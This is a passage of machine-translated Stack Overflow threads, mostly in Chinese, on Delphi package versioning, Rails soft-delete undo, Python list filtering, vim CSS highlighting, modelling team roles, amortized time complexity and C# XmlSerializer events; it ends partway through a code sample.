在我以前的工作中，我编写了一个小工具来帮助我们进行版本控制。我真的应该在业余时间重新创建该工具并使其可用。不过，这个工具并不难写，所以也许你可以自己实现类似的东西。

基本上它是这样工作的：

*   Subversion repo 包含子文件夹中的所有包。repo 中的每个包文件夹都有相同的子文件夹：Lib（用于 DCU）、Source、Help（如果需要）
*   在 repo 的根文件夹中，该工具与一个 XML 文件一起放置。
*   XML 文件为每个包指定了所有需要的信息：哪个文件夹包含 DCU，哪个文件夹包含源，需要运行哪个命令以获得帮助。
*   该工具读取 XML 并显示所有可用包的复选框。已安装的包（从 BDS 注册表中读取）被标记为选中。
*   用户可以选择要安装/卸载的软件包。
*   该工具在 BDS 注册表中添加/删除必要的键。它将 DCU/Lib 文件夹添加到 IDE 的搜索路径中，将源文件夹添加到 IDE 浏览路径中，并向自定义 IDE 专家注册帮助命令（此专家提供了默认帮助菜单的扩展以启动所有已安装软件包的帮助）
*   该工具甚至会检查包之间的冲突和依赖关系。例如，Raize Components 的第 3 版和第 4 版都可用，它们不能同时处于活动状态。依赖关系检查对于从 TurboPower AsyncPro 派生的内部组件很有用（许多内部组件依赖于通过 AsyncPro 进行的串行通信）

一个可能的扩展是能够保存/加载包的选择并将该选择存储在每个项目中，这样您就可以只加载特定项目所需的包。

当公司从 Delphi 5/7 迁移到 Delphi 2007 时，我实现了所有这些。我们之前在包版本控制方面遇到了很多问题，并且想要某种方式来对所有不同的包进行版本控制。

这种方法提供了一些不错的优势：

*   当必须进行错误修复或发布第三方软件包的新版本时，必须由一个人将更改提交给 subversion。所有其他开发人员都可以从 subversion 进行更新并拥有最新版本而没有任何问题。
*   当将新的组件包添加到环境中时，一个人必须提交所有文件，更改 XML 包列表，然后其他开发人员可以进行 subversion 更新并运行该工具以轻松集成包。
*   所有第三方和自定义内部组件现在都可以轻松进行版本控制。
*   通过在 subversion 存储库中包含 DCU（和其他二进制文件），我们确保所有开发人员都使用相同的编译版本。之前，不同的编译可能使用不同的设置，这会导致某些组件的行为不同。
*   当所有其他开发人员最终安装 Delphi 2007 时，他们的软件包在不到 10 分钟内就安装好了（大部分时间都花在从 subversion repo 下载所有东西上；该工具本身可以在不到 2 秒的时间内安装 20 个软件包）。以前，手动安装 Delphi5/7 的所有软件包可能需要 2 天时间才能完成所有安装。

这不仅仅用于一些内部组件，repo 还包括一些大型组件包：Raize Components、JCL/JVCL（尽管使用他们的安装程序而不是工具）、DevExpress Quantum Grid 3 和 4、TurboPower异步专业版

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-14T09:22:55.663

这也不容易。不过，您可以使用自定义注册表 hack 以及您感兴趣的每个配置的特定 bds 快捷方式来做到这一点：

> 要使用，只需创建一个新的快捷方式并修改命令行以传递例如 -rMyAlternateBDSReg。然后在启动一次之后，创建 reg 条目，他们可以根据需要配置备用注册表，删除包等，而不必担心会弄乱默认安装。

从[代码齿轮](http://dn.codegear.com/article/33805)

如果您为每个项目设置了配置，则可以为给定项目启动相应的快捷方式。这不是自动的，但总比一直拥有一切要好。

一个很好的副作用是加载时间将得到改善。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T16:00:23.567

我们将包的源代码与重建它们的批处理文件一起放在源代码控制中。如果包的树发生变化，那么我们将重建它们。这并没有解决安装新包的问题，​​但是有一些注册表点击可以解决这个问题，所以我们可以包含 .reg 片段来处理这个问题。

# ruby-on-rails - 在 Rails 中实现 gmail 样式“撤消”的最佳方法是什么？

> ID：200372
> 
> 赞同：16
> 
> 时间：2008-10-14T08:21:39.280
> 
> 标签：ruby-on-rails, activerecord, gmail, undo, revert

我认为在销毁记录时使用“**撤消**”方法 ala **gmail**而不是显示一个恼人的弹出窗口，上面写着“*你确定吗？* ”，这一点很重要。

我实现这一点的方式是在模型中有一个“deleted_at”时间戳列，当调用**destroy**方法时它会被加上时间戳

```
def destroy
  @foo = Foo.find(params[:id])
  @foo.update_attribute(:deleted_at, Time.now)
  ...
end 
```

要**还原/撤消**，我只需将同一列设置为 nil

```
def revert
  @foo = Foo.find(params[:id])
  @foo.update_attribute(:deleted_at, nil)
  ...
end 
```

当我调用 find 方法时，我只需要添加一个条件来过滤掉“已删除”的 foos。也许设置一个 cron 或后台任务在一段时间后真正销毁“已删除”的 foo。

对我有用且易于实现，但我很好奇是否有更好的方法来实现此功能？也许有一个插件或gem提供了我不知道的这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T16:31:49.523

确实有一些插件可以在[Agile Web Development](http://agilewebdevelopment.com/plugins)中找到。

以下是似乎与您的描述相匹配的插件的链接和摘要：

1.  [充当偏执狂](http://agilewebdevelopment.com/plugins/acts_as_paranoid)：让您的活动记录“偏执”。删除它们不会删除该行，而是设置一个 deleted_at 字段。Find 被重载以跳过已删除的记录。
2.  [充当软删除](http://agilewebdevelopment.com/plugins/acts_as_soft_deletable)：提供软删除 ActiveRecord 模型的能力。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T08:46:36.373

[这里](http://github.com/alto/redline/tree/ed884597354762572b4112ef4d3d13a13d051faa/lib/acts_as_deletable.rb)有一个文件似乎可以满足您的要求，但我个人认为必须有一些东西可以自动过滤掉已删除的记录，除非您特别包含它们。这样，除非您包含重新包含它们的参数或命名范围，否则它们实际上会被删除。

可惜我没写过，业余时间有限，不过应该没那么难吧？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T15:08:04.390

您可以将已删除的项目移动到单独的集合（或表或其他）中 - 然后在原始列表中查看的任何内容都会看到它已被删除，并且您可以在方便时处理新列表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-11T15:03:55.050

[PaperTrail](https://github.com/airblade/paper_trail)很好地做到了这一点。上面有一个很好的[Railscast](http://railscasts.com/episodes/255-undo-with-paper-trail)，虽然它现在有点旧了。我知道这个问题是很久以前提出的，但出于好奇，我偶然发现了它，并认为我应该参考一个很好的最新方法。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-10-14T08:48:35.467

责任链模式

```
class Action
{
  Perform(context);
  Undo(context);
} 
```

# python - python中的快速过滤方法

> ID：200373
> 
> 赞同：1
> 
> 时间：2008-10-14T08:25:09.647
> 
> 标签：python, list, filter

我想用 python 脚本中任何最快的方法过滤两个列表。`filter()`为此，我使用了内置方法。但它很慢而且花费太多时间，因为我有很大的列表，我认为每个列表中有超过 500 万个项目，或者可能更多。我不知道我会怎么做。请如果有人有想法或为它编写小功能。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-14T10:18:45.160

Maybe your lists are too large and do not fit in memory, and you experience [thrashing](http://en.wikipedia.org/wiki/Thrash_(computer_science)). If the sources are in files, you do not need the whole list in memory all at once. Try using *[itertools](https://docs.python.org/2/library/itertools.html#itertools.ifilter)*, e.g.:

```
from itertools import ifilter

def is_important(s):
   return len(s)>10

filtered_list = ifilter(is_important, open('mylist.txt')) 
```

Note that *ifilter* returns an *iterator* that is fast and memory efficient.

[Generator Tricks](http://www.dabeaz.com/generators/) is a tutorial by David M. Beazley that teaches some interesting uses for *generators*.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T12:50:25.213

如果你能避免一开始就创建列表，你会更快乐。

而不是

```
aBigList = someListMakingFunction()
filter( lambda x:x>10, aBigList ) 
```

您可能想查看生成列表的函数。

```
def someListMakingGenerator( ):
    for x in some source:
        yield x 
```

那么您的过滤器不会涉及大量内存

```
def myFilter( aGenerator ):
    for x in aGenerator:
        if x > 10: 
            yield x 
```

通过使用生成器，您不会在内存中保留太多内容。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-14T10:24:46.800

Filter will create a new list, so if your original is very big, you could end up using up to twice as much memory. If you only need to process the results iteratively, rather than use it as a real random-access list, you are probably better off using ifilter instead. ie.

```
for x in itertools.ifilter(condition_func, my_really_big_list):
    do_something_with(x) 
```

Other speed tips are to use a python builtin, rather than a function you write yourself. There's a itertools.ifilterfalse specifically for the case where you would otherwise need to introduce a lambda to negate your check. (eg "ifilter(lambda x: not x.isalpha(), l)" should be written "ifilterfalse(str.isalpha, l)")

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T12:49:35.840

知道条件列表理解通常比相应的 lambda 快得多可能很有用：

```
>>> import timeit
>>> timeit.Timer('[x for x in xrange(10) if (x**2 % 4) == 1]').timeit()
2.0544309616088867
>>> timeit.f = lambda x: (x**2 % 4) == 1
timeit.Timer('[x for x in xrange(10) if f(x)]').timeit()
>>> 
3.4280929565429688 
```

（不知道为什么我需要把 f 放在`timeit`命名空间中，那里。并没有真正使用过这个模块。）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T08:39:16.123

我猜 filter() 尽可能快，而不必在 C 中编写过滤函数（在这种情况下，你最好用 C 编写整个过滤过程）。

为什么不粘贴要过滤的功能？这可能会导致更容易的优化。

阅读[这篇](http://www.python.org/doc/essays/list2str.html)关于 Python 优化的文章。这是[关于](http://docs.python.org/api/api.html)Python/C API 的。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-14T10:19:48.060

Before doing it in C, you could try [numpy](http://numpy.scipy.org/). Perhaps you can turn your filtering into number crunching.

# vim - 改进了 vim 中的 CSS 语法高亮显示

> ID：200378
> 
> 赞同：3
> 
> 时间：2008-10-14T08:28:57.173
> 
> 标签：vim, syntax-highlighting, vim-syntax-highlighting

vim 中的 CSS 语法高亮并不是完全最优的。例如：

```
div.special_class 
```

在 处停止突出显示`_`。

有没有改进的荧光笔不会咬下划线？

更新：我正在使用 VIM - Vi IMproved 7.1（2007 年 5 月 12 日，2008 年 6 月 17 日 15:22:40 编译）

我的 css.vim 的标题是：

```
" Vim syntax file
" Language:     Cascading Style Sheets
" Maintainer:   Claudio Fleiner <claudio@fleiner.com>
" URL:          http://www.fleiner.com/vim/syntax/css.vim
" Last Change:  2006 Jun 19
" CSS2 by Nikolai Weibull
" Full CSS2, HTML4 support by Yeti 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T09:43:33.903

我没有那个问题。这是我的语法文件的标题：

```
" Vim syntax file
" Language: Cascading Style Sheets
" Maintainer:   Claudio Fleiner <claudio@fleiner.com>
" URL:      http://www.fleiner.com/vim/syntax/css.vim
" Last Change:  2007 Nov 06
" CSS2 by Nikolai Weibull
" Full CSS2, HTML4 support by Yeti 
```

语法文件的相关行是：

```
syn match cssClassName "\.[A-Za-z][A-Za-z0-9_-]\+" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T08:36:08.003

你用的是什么版本的vim？

我的 css.vim 是

```
" Vim syntax file
" Language: Cascading Style Sheets
" Maintainer:   Claudio Fleiner <claudio@fleiner.com>
" URL:      http://www.fleiner.com/vim/syntax/css.vim
" Last Change:  2005 Nov 23
" CSS2 by Nikolai Weibull
" Full CSS2, HTML4 support by Yeti 
```

与 vim 7.0 一起提供，并且它不会暴露您描述的行为。

# design-patterns - 是否有对包含团队、角色和技能的结构进行建模的设计模式？

> ID：200380
> 
> 赞同：3
> 
> 时间：2008-10-14T08:30:33.757
> 
> 标签：design-patterns, oop, modeling

我需要为一个系统建模，其中将有一个团队，该团队将由在团队中执行角色并分配给他们技能的用户组成。

*即A队5人，1人担任组长角色，都担任回复邮件的角色，但有些人有额外的接电话技能*

我正在尝试确定如何最好地对此进行建模。

这个问题之前一定已经解决了，有没有关于如何建模的好资源？

编辑：我需要确定允许用户做什么，这可能是因为他们在某个团队中，执行某个角色或被分配了某种技能

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T20:24:34.047

听起来您可以在这里使用复合模式的变体，至少对于部分问题。您可以从充当超类的 Unit 开始，然后您可以将 Team 作为 Unit 的子类。团队是一个容器，可能包含其他单位。此外，您可以拥有 User 子类 Unit。因此，您可以编写仅以单元为目标的代码，并以相同的方式对待所有团队和用户。然后，您可以创建一些由其他团队组成的复杂团队。

因此，您可以为您需要的每种用户类型或团队类型提供一个类。

如果角色的数量急剧增长并且你最终得到了太多的类（类爆炸），那么你可以应用装饰器模式。因此，您用另一个具有相似接口但不同（或附加）功能的对象包装（装饰）一个对象。

所以你可以有一个 BasicUser 和 AnswerPhoneDecorator。将任何 BasicUser 对象包装在 AnswerPhoneDecorator 中，您就有了一个可以接听电话的用户。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T11:07:11.707

我在谷歌上搜索了这个，所以带着一粒盐。我发现了[这篇](http://www.riehle.org/computer-science/research/1997/ubilab-tr-1997-1-1.pdf)关于角色建模和对象的论文。在第 30 页有一个角色模式。希望这对你来说不是一场疯狂的追逐。这是摘要

> 角色模式允许您设计一个组件，该组件可以在运行时使用新的上下文对象进行扩展，称为角色。根据上下文对象模式使用角色扩展组件。Component对应一个Decorator的Component，一个Role对应一个Context Object。角色扮演组件的状态集成是通过应用属性和策略来实现的。Property 用于定义 Component 的状态空间，Strategy 用于提供 Property 依赖的行为。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T10:37:45.137

不是我听说过的任何事情，但它很简单，可以通过各种方式解决。

所以有团队、成员、角色和技能。团队只是成员容器，成员具有角色和技能。

这里还有一个小伪给你整个想法：

```
class Team
    container[Member] members

class Member
    container[Role] roles
    container[Skill] skills 
```

然后根据它们是什么类型的东西以及你的编程语言的能力来实例化或子类化角色和技能。

..另一方面，在实践中，使 Team 类类似于 Role 和 Skill 类可能是有意义的——Member 类的属性。如果您需要找出某个成员可以访问的内容等信息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-06T09:23:52.847

我发现[Enterprise Patterns and MDA: Building Better Software with Archetype Patterns and UML](http://books.google.com/books?id=NefmonGgEEMC&dq=Enterprise+Patterns+and+MDA:+Building+Better+Software+with+Archetype+Patterns+and+UML&printsec=frontcover&source=bn&hl=en&ei=KOuwSa78A5mzjAfz9vziBQ&sa=X&oi=book_result&resnum=7&ct=result#PRA1-PA157,M1)中的第 5 章讨论了如何很好地建模关系

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T00:52:11.573

这取决于您要建模的内容。鉴于上面的示例，您是否希望能够找到最适合给定问题的团队成员？

如果是这样的话，那么我会推荐这样的东西：将角色和技能想象为无向图中的顶点。给定的角色（通​​过边缘）与它能够具备的每项技能相关联（假设技能是由角色赋予的，而不仅仅是基于个人）。现在将所有团队成员连接到他们在团队中的任何角色，并将团队成员连接到适当的团队。

该图现在模拟了您的团队、团队成员、他们的角色以及他们应该赋予其角色的技能之间的关联。

现在要将给定的问题映射到团队成员（甚至团队），将问题与您认为需要的每个不同技能（即电子邮件、数据库、Web UI、Web 服务等）联系起来。现在您也可以将问题与这些实体相关联。

我不会介绍您可以使用它运行的每种类型的报告，但这里有一个简单的报告。如果您想找到一个可以解决该问题的人（如果他们存在），我会推荐这样的图遍历：

```
class Problem
{
  find_problem_solvers()
  {
    var problem_solvers = null
    for each (skill in skills_required)
    {
      var possible_problem_solvers = skill.find_problem_solvers()
      if(problem_solvers == null)
      {
        problem_solvers = new list().add_range(possible_problem_solvers)
      }
      else
      {
        for each problem_solver in problem_solvers:
        {
          if(problem_solver not in possible_problem_solvers)
            problem_solvers.remove(problem_solver)
        }
      }
      //No point continuing if we eliminated everyone!
      if(problem_solvers is empty) break;
     }
     return problem_solvers
   }
 } 
```

正如你在这方面看到的那样，我对其他海报的图案没有太多用处。如果您正在尝试对域安全性或某种不同的业务逻辑进行建模。他们的技术很可能是正确的。

顺便说一下，上面的算法并不是最优的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-15T07:20:44.067

在您的示例中，我至少有 TeamMember BaseClass 和 2 个接口（iEmail 和 iPhone）。任何新的角色都将继承自 TeamMember 类，并根据它可以做什么，实现适当的接口……简而言之，角色将作为继承自 TeamMember 的类来实现，而技能将作为接口来实现。

例如，允许团队负责人拨打电话。然后我会让 TeamLeader 类继承自 TeamMember 并实现 iPhone 接口

[温迪](http://www.rwendi.com "温迪")

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-15T08:03:30.550

尽管我相信设计模式是一个很好的工具，但我认为我不会使用任何特定的模式来解决这个问题。相反，我会尝试从不同的角度来处理它。我建议使用一个数据库来存储有关您的团队、团队成员及其角色的数据。现在，数据库并不是我的强项，但我会试一试：
创建一个表格来保存所有团队的所有团队成员。该表应具有属性：名称、角色、团队、技能，分别代表成员的名称和角色、他/她所属的团队以及他/她的技能。
现在，假设您的应用中有以下角色：RoleA（可以接听电话和发送电子邮件），角色B（只能发送电子邮件）和角色 TeamLeader（可以接听电话，发送电子邮件）例如，去开会。角色表将保存您应用程序中的所有角色，属性将是（在这种情况下）：名称（角色名称），canAnswerPhone（布尔值，表示具有此角色的用户是否可以接听电话），可以发送电子邮件（布尔值表示他/她是否可以发送电子邮件）等等......
第三张表可以，例如，保存您的应用程序中的所有团队，以及关于他们的各种数据（例如，团队正在进行的项目等....）。
现在，您可以轻松地了解团队中的所有成员，他们可以做什么，改变他们的角色，看看谁是领导者，改变某个角色的作用等等...

我希望这对你有意义。祝您设计应用程序好运！

# algorithm - 恒定摊销时间

> ID：200384
> 
> 赞同：474
> 
> 时间：2008-10-14T08:32:47.073
> 
> 标签：algorithm, complexity-theory, big-o

在谈论算法的时间复杂度时，“恒定摊销时间”是什么意思？

* * *

## 回答 #1

> 赞同：860
> 
> 时间：2008-10-30T09:48:34.520

摊销时间简单解释：

如果您进行操作说一百万次，您并不真正关心该操作的最坏情况或最佳情况 - 您关心的是当您重复操作一百万次时总共花费了多少时间.

因此，操作是否偶尔非常缓慢并不重要，只要“偶尔”足够稀有，可以将缓慢冲淡掉。基本上摊销时间是指“每次操作所花费的平均时间，如果你做了很多操作”。摊销时间不必是恒定的；你可以有线性和对数摊销时间或其他任何东西。

让我们以 mats 的动态数组为例，您可以在其中重复添加新项目。通常添加一个项目需要恒定的时间（即`O(1)`）。但是每次阵列满时，您都会分配两倍的空间，将数据复制到新区域，并释放旧空间。假设分配和释放在恒定时间内运行，这个扩大过程需要`O(n)`时间，其中 n 是数组的当前大小。

因此，每次放大时，您花费的时间大约是上次放大的两倍。但是你也等了两倍的时间才这样做！因此，每次扩大的成本可以在插入之间“分摊”。这意味着从长远来看，将*m*项添加到数组所需的总时间为`O(m)`，因此摊销时间（即每次插入的时间）为`O(1)`。

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2008-10-14T08:48:11.053

这意味着随着时间的推移，最坏的情况将默认为 O(1) 或恒定时间。一个常见的例子是动态数组。如果我们已经为一个新条目分配了内存，那么添加它将是 O(1)。如果我们还没有分配它，我们将通过分配，比如说，当前数量的两倍来分配它。这个特定的插入*不会*是 O(1)，而是其他东西。

重要的是该算法保证在一系列操作之后，昂贵的操作将被摊销，从而呈现整个操作 O(1)。

或者更严格地说，

> 有一个常数 c，因此对于 长度为 L 的*每个*操作序列（也以代价高昂的操作结束），时间不大于 c*L（感谢[Rafał Dowgird](https://stackoverflow.com/users/12166/rafa-dowgird)）

* * *

## 回答 #3

> 赞同：33
> 
> 时间：2017-01-19T10:17:41.617

要开发一种直观的思考方式，请考虑在[动态数组](https://en.wikipedia.org/wiki/Dynamic_array)中插入元素（例如`std::vector`在 C++ 中）。让我们绘制一个图表，显示在数组中插入 N 个元素所需的操作数 (Y) 的依赖关系：

[![阴谋](https://i.stack.imgur.com/CPP0P.jpg)](https://i.stack.imgur.com/CPP0P.jpg)

黑色图形的垂直部分对应于内存的重新分配以扩展数组。在这里我们可以看到，这种依赖关系可以粗略地表示为一条线。这个线方程是`Y=C*N + b`（`C`是常数，`b`在我们的例子中= 0）。因此，我们可以说我们需要`C*N`平均花费操作来将 N 个元素添加到数组中，或者`C*1`操作来添加一个元素（摊销常数时间）。

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2016-07-08T07:42:23.433

在重复阅读 3 次后，我发现下面的 Wikipedia 解释很有用：

来源：[https ://en.wikipedia.org/wiki/Amortized_analysis#Dynamic_Array](https://en.wikipedia.org/wiki/Amortized_analysis#Dynamic_Array)

> “动态阵列
> 
> 动态数组推送操作的摊销分析
> 
> 考虑一个动态数组，它随着更多元素的添加而增长，例如 Java 中的 ArrayList。如果我们从一个大小为 4 的动态数组开始，将四个元素压入它需要恒定的时间。然而，将第五个元素推入该数组需要更长的时间，因为该数组必须创建一个两倍于当前大小 (8) 的新数组，将旧元素复制到新数组中，然后添加新元素。接下来的三个 push 操作同样需要恒定的时间，然后随后的添加将需要另一个缓慢的数组大小加倍。
> 
> 一般来说，如果我们考虑将任意数量的推送 n 到大小为 n 的数组，我们注意到推送操作需要恒定时间，除了最后一个需要 O(n) 时间来执行大小加倍操作的操作。由于总共有 n 次操作，我们可以取其平均值，并发现将元素推入动态数组需要：O(n/n)=O(1)，恒定时间。”

我的理解是一个简单的故事：

假设你有很多钱。而且，你想把它们堆放在一个房间里。而且，您的手和腿很长，只要您现在或将来需要。而且，你必须把所有东西都填在一个房间里，所以很容易把它锁起来。

因此，您直接走到房间的尽头/角落并开始堆叠它们。当你堆叠它们时，房间会慢慢地用完空间。但是，当您填充时，很容易将它们堆叠起来。拿到钱，放钱。简单的。它是 O(1)。我们不需要转移任何以前的资金。

一旦房间空间不足。我们需要另一个更大的房间。这里有一个问题，因为我们只能有 1 个房间，所以我们只能有 1 个锁，我们需要把那个房间里所有现有的钱都转移到新的更大的房间里。所以，把所有的钱，从小房间转移到大房间。即，再次将它们全部堆叠。所以，我们确实需要转移所有以前的钱。因此，它是 O(N)。（假设 N 是前一笔钱的总金额）

换句话说，很容易直到 N，只有 1 次操作，但是当我们需要搬到更大的房间时，我们做了 N 次操作。所以，换句话说，如果我们平均下来，它是在开始时插入 1 次，然后在移动到另一个房间时再移动 1 次。总共 2 次操作，一次插入，一次移动。

假设即使在小房间里 N 也像 100 万一样大，那么与 N（100 万）相比的 2 次操作并不是一个真正的可比数字，因此它被认为是常数或 O(1)。

假设当我们在另一个更大的房间里做以上所有事情时，又需要搬家。它仍然是一样的。比如说，N2（比如说，10 亿）是更大房间里新的钱数

所以，我们有 N2（包括以前的 N，因为我们把所有房间都从小房间搬到了大房间）

我们仍然只需要两个操作，一个是插入更大的房间，然后另一个移动操作移动到一个更大的房间。

因此，即使对于 N2（10 亿），每个操作也是 2 次。这又没什么了。所以，它是常数，或 O(1)

因此，随着 N 从 N 增加到 N2 或其他，这并不重要。它仍然是恒定的，或者 N 中的每一个都需要 O(1) 次操作。

* * *

现在假设，你有 N 为 1，非常小，钱数很少，你有一个很小的房间，只能容纳 1 个钱。

只要你把钱填在房间里，房间就被填满了。

当你去更大的房间时，假设它只能再装1个钱，总共2个钱。这意味着，前一个移动的钱和另外 1 个。它又被填满了。

这样，N 增长缓慢，不再是 O(1) 常数，因为我们将所有钱从前一个房间转移，但只能再容纳 1 个钱。

100 次后，新房间可以容纳 100 元以前的钱，还能容纳 1 多钱。这是O(N)，因为O(N+1)就是O(N)，也就是100和101的度数相同，都是百，而不是之前的故事，一到百万，一到十亿.

因此，这是为我们的钱（变量）分配房间（或内存/ RAM）的低效方式。

* * *

所以，一个好方法是分配更多的空间，以 2 的幂。

第 1 个房间大小 = 适合 1 个钱币
第 2 个房间大小 = 适合 4 个钱币
第 3 个房间大小 = 适合 8 个钱币
第 4 个房间大小 = 适合 16 个钱币
第 5 个房间大小 = 适合 32 个钱币
第 6 个房间大小 = 适合64 钱数
第 7 间房间大小 = 适合 128 钱数
第 8 间房间大小 = 适合 256 钱数
第 9 间房间大小 = 适合 512 钱数
第 10 间房间大小 = 适合 1024 钱数
第 11 间房间大小 = 适合 2,048 钱数
。 ..第
16 间房间大小 = 可容纳 65,536 点钱
...
第 32 间房间大小 = 可容纳 4,294,967,296 点钱
...
第 64 间房间大小 = 可容纳 18,446,744,073,709,551,616 点钱

为什么这样更好？因为它看起来在开始时增长缓慢，后来增长更快，也就是说，与我们 RAM 中的内存量相比。

这很有帮助，因为在第一种情况下，虽然它很好，但每笔钱要完成的总工作量是固定的 (2)，并且无法与房间大小 (N) 相比，但我们在初始阶段占用的房间可能也太大了大（100 万），我们可能无法完全使用，这取决于我们是否可以在第一种情况下节省那么多钱。

但是，在最后一种情况下，2 的幂，它会在我们的 RAM 的限制中增长。因此，随着 2 的幂次增加，Armotized 分析保持不变，并且对于我们今天拥有的有限 RAM 是友好的。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2021-02-17T06:10:47.513

我创建了这个简单的 python 脚本来演示 python 列表中追加操作的分摊复杂性。我们不断向列表中添加元素并为每个操作计时。在这个过程中，我们注意到一些特定的追加操作需要更长的时间。这些峰值是由于正在执行新的内存分配。需要注意的重要一点是，随着追加操作数量的增加，尖峰会变得更高，但间距会增加。间距的增加是因为每次初始内存遇到溢出时都会保留更大的内存（通常是之前的两倍）。希望这会有所帮助，我可以根据建议进一步改进它。

```
import matplotlib.pyplot as plt
import time

a = []
N = 1000000

totalTimeList = [0]*N
timeForThisIterationList = [0]*N
for i in range(1, N):
    startTime = time.time()
    a.append([0]*500) # every iteartion, we append a value(which is a list so that it takes more time)
    timeForThisIterationList[i] = time.time() - startTime
    totalTimeList[i] = totalTimeList[i-1] + timeForThisIterationList[i]
max_1 = max(totalTimeList)
max_2 = max(timeForThisIterationList)

plt.plot(totalTimeList, label='cumulative time')
plt.plot(timeForThisIterationList, label='time taken per append')
plt.legend()
plt.title('List-append time per operation showing amortised linear complexity')
plt.show() 
```

这会产生以下情节[![在此处输入图像描述](https://i.stack.imgur.com/0CQd7.png)](https://i.stack.imgur.com/0CQd7.png)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-05-10T20:38:35.990

上面的解释适用于聚合分析，即对多个操作进行“平均”的想法。我不确定它们如何应用于银行家方法或摊销分析的物理学家方法。

现在。我不确定正确的答案。但这与物理学家+银行家方法的主要条件有关：

（摊销运营成本总和）>=（实际运营成本总和）。

我面临的主要困难是，鉴于运营的摊销渐近成本不同于正常渐近成本，我不确定如何评估摊销成本的重要性。

那就是当有人给我一个摊销成本时，我知道它与正常渐近成本不同那我从摊销成本中得出什么结论？

由于我们有一些操作被多收而其他操作被少收的情况，一个假设可能是引用单个操作的摊销成本将毫无意义。

例如：对于斐波那契堆，仅将递减键的摊销成本引用为 O(1) 是没有意义的，因为“早期操作在增加堆潜力方面所做的工作”会降低成本。

或者

我们可以有另一个假设来解释摊销成本的原因如下：

1.  我知道昂贵的操作将在多个低成本操作之前进行。

2.  为了便于分析，我将对一些低成本操作收取过高的费用，这样它们的渐近成本不会改变。

3.  通过这些增加的低成本操作，我可以证明昂贵的操作具有较小的渐近成本。

4.  因此，我改进/降低了 n 次操作成本的渐近边界。

因此，摊销成本分析 + 摊销成本界限现在仅适用于昂贵的操作。廉价操作的渐近摊销成本与其正常渐近成本相同。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-09-04T09:14:49.120

任何函数的性能都可以通过将“函数调用总数”除以“所有这些调用所花费的总时间”来平均。即使是每次调用花费的时间越来越长的函数，仍然可以通过这种方式进行平均。

因此，执行函数的本质`Constant Amortized Time`是，这个“平均时间”达到了一个上限，随着调用次数的不断增加，这个上限不会被超过。任何特定调用的性能可能会有所不同，但从长远来看，这个平均时间不会越来越大。

这是在`Constant Amortized Time`.

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-12-26T07:46:54.110

**摊销运行时间：这是指根据每个操作**使用的时间或内存计算算法复杂度。它用于大多数情况下操作很快但在某些情况下算法的操作很慢。因此，研究操作序列以了解更多关于摊销时间的信息。

# c# - 在 .Net/C# 中是为 XmlSerializer.Serialize 触发的 OnSerializing 事件

> ID：200386
> 
> 赞同：7
> 
> 时间：2008-10-14T08:33:52.797
> 
> 标签：c#, .net

我想在对象被序列化之前设置一些属性，但是由于它可以从多个位置序列化，有没有办法使用 OnSerializing 方法（或类似方法）进行 Xml 序列化 - 我的类很大程度上是这样的 - 但是On... 方法没有被调用...：

```
[Serializable]
[XmlRoot(ElementName = "ResponseDetails", IsNullable = false)]
public class ResponseDetails
{
    public ResponseDetails() {}

    [OnSerializing]
    internal void OnSerializingMethod(StreamingContext context)
    {
        logger.Info("Serializing response");
    }

    [OnSerialized]
    internal void OnSerializedMethod(StreamingContext context)
    {
        logger.Info("Serialized response");
    }

    [OnDeserialized]
    internal void OnDeserializedMethod(StreamingContext context)
    {
        logger.Info("Deserialized response");
    }

    [OnDeserializing]
    internal void OnDeserializingMethod(StreamingContext context)
    {
        logger.Info("Deserializing response");
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-14T08:52:00.093

不，`XmlSerializer`不支持这个。如果您使用的是 .NET 3.0 或更高版本，请查看`DataContractSerializer`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2011-09-22T09:34:14.590

我试图打破一些冰。请看一看。创建一个名称`MyXMLSerializer`如下的类：

```
public  class MyXMLSerializer
{
    delegate void del_xmlSerializing();
    del_xmlSerializing ds;       

    delegate void del_xmlSerialized(System.IO.Stream stream, object o);
    AsyncCallback cb;
    del_xmlSerialized dd;

    delegate void del_xmlDeserializing();
    del_xmlDeserializing dx;       

    delegate object del_xmlDeserialized(System.IO.Stream stream);
    AsyncCallback db;
    del_xmlDeserialized xd;
    object FinalDeserializedObject = null;

    public MyXMLSerializer()
    {           
    }

    public void Serialize(System.IO.Stream stream,object o,Type ClassType)
    {
        XmlSerializer xx = new XmlSerializer(ClassType);

        /* ON Serialization Beginning [ONSERIALIZING] */
        ds = new del_xmlSerializing(OnXMLSerializing_Begin);
        IAsyncResult IAR_Begin = ds.BeginInvoke(null, null);
        ds.EndInvoke(IAR_Begin);
        /* ON Serialization Beginning [ONSERIALIZING] */

        /* ON Serialization Completed ie [ONSERIALIZED] */
        dd = new del_xmlSerialized(xx.Serialize);
